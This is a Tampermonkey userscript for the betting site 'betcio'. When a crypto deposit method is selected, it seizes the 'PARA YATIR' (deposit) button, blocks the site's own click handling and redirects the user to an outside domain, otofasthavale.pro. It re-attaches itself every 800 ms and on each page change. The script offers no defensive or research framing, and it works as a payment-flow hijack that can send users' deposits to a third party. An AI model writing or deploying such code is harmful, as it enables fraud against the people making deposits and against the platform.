// ==UserScript==
// @name         Betcio - Kripto Span + PARA YATIR Buton Yönlendirme
// @namespace    http://tampermonkey.net/
// @version      1.2
// @description  Span'da kripto/lipay varsa VE "PARA YATIR" butonuna basılırsa otofasthavale.pro'ya gider
// @match        *://*.betcio*/*
// @match        *://m.betcio*/*
// @grant        none
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';

    const KRIPTO_KELIMELER = ['lipay', 'xpay', 'kripto', 'kriptopay', 'crypto', 'usdt', 'btc', 'eth', 'tron']
        .map(w => w.toLowerCase());

    const METHOD_SPAN_XPATH = "/html/body/div[1]/div[11]/div/div/div[4]/div/div[1]/span";

    function getElementByXPath(xpath) {
        try {
            return document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
        } catch (e) {
            return null;
        }
    }

    function isKriptoSecili() {
        const span = getElementByXPath(METHOD_SPAN_XPATH);
        if (!span) return false;

        const text = (span.textContent || '').toLowerCase().trim();
        console.log('[Debug] Seçili yöntem span:', text);

        return KRIPTO_KELIMELER.some(k => text.includes(k));
    }

    function findParaYatirButton() {
        // En yaygın ve güvenilir kriterler
        const candidates = document.querySelectorAll('button[type="submit"], button.btn, button.deposit, button.a-color');

        for (const btn of candidates) {
            const text = (btn.textContent || '').trim();
            const title = btn.getAttribute('title') || '';
            const classList = btn.className.toLowerCase();

            const hasText = text.includes('PARA YATIR') || text.includes('Para Yatır');
            const hasTitle = title.includes('PARA YATIR') || title.includes('Para Yatır');
            const hasDepositClass = classList.includes('deposit');

            if ((hasText || hasTitle) && hasDepositClass) {
                console.log('[Debug] PARA YATIR butonu bulundu:', btn.outerHTML.substring(0, 120) + '...');
                return btn;
            }
        }

        return null;
    }

    function setupYonlendirme() {
        if (!isKriptoSecili()) {
            console.log('[Yönlendirme] Kripto yöntemi DETEKTİF EDİLEMEDİ → pasif');
            return;
        }

        console.log('[Yönlendirme] Kripto aktif → PARA YATIR butonu izleniyor');

        const button = findParaYatirButton();

        if (button) {
            // Tekrar eklenmesin diye klonlayıp değiştiriyoruz (güvenli yöntem)
            const newButton = button.cloneNode(true);
            button.parentNode.replaceChild(newButton, button);

            newButton.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();

                console.log('PARA YATIR butonuna tıklandı (kripto aktif) → YÖNLENDİRME!');
                window.location.href = 'https://otofasthavale.pro';
            }, true);  // capture phase - çok erken müdahale

            console.log('Buton ele geçirildi');
        }
    }

    // Başlangıç + dinamik takip
    setTimeout(setupYonlendirme, 900);

    setInterval(setupYonlendirme, 800);

    // DOM veya içerik değiştiğinde tetikle
    const observer = new MutationObserver(setupYonlendirme);
    observer.observe(document.body, {
        childList: true,
        subtree: true,
        characterData: true
    });

})();
